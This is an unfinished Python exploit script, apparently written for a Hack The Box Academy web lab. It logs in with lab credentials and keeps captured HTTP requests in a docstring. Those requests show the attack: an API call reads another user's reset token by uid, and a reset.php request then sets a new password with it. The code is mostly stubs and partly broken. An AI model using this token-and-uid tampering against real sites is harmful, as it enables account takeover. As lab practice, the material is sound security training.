#!/usr/bin/pyhon3

from typing import Any
from pprint import pprint
import requests
from pwn import *
import sys


def login(main_url: str):
    sess = requests.session()
    data = {
        "username": "htb-student",
        "password": "Academy_student!"
    }
    ress = sess.post(url=main_url+"index.php", data=data)
    print("the headers: ", ress.headers)
    return sess


def vuln_explotation(main_url: str, sess: Any):
    log.progress("finding vulnerabilies in the update method")

    response = sess.get(url=main_url+"index.php")
    # print(sess.headers)
    # print(response.headers)
    # pprint(response.text)


def reset_password(main_url: str, sess: Any):

    reset = sess.post(url=main_url+"reset.php")
    referer = main_url+"settings.php"
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    """

        {"uid":"1","username":"s.applewhite","full_name":"Samanta Applewhite","company":"Daniel Inc"}

        
        changing the passwords.
        These are the methods implemented by the web

        GET /api.php/token/74 HTTP/1.1
        Host: 68.183.45.200:30028
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Referer: http://68.183.45.200:30028/settings.php
        DNT: 1
        Connection: close
        Cookie: PHPSESSID=8fnco5gs07bc5ui1j76v4d96vj; uid=74

        POST /reset.php HTTP/1.1
        Host: 68.183.45.200:30028
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Referer: http://68.183.45.200:30028/settings.php
        Content-Type: application/x-www-form-urlencoded
        Origin: http://68.183.45.200:30028
        Content-Length: 67
        DNT: 1
        Connection: close
        Cookie: PHPSESSID=8fnco5gs07bc5ui1j76v4d96vj; uid=74

        uid=74&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=password"""


def main():
    try:
        url = sys.argv[1]
        sess = login(main_url=url)

        vuln_explotation(main_url=url, sess=sess)

    except Exception as e:
        print(str(e))
        log.failure('Error trying to parse the url...')
        exit(1)
    except KeyboardInterrupt:
        log.warn('exiting...')
        exit(0)


if __name__ == "__main__":
    main()
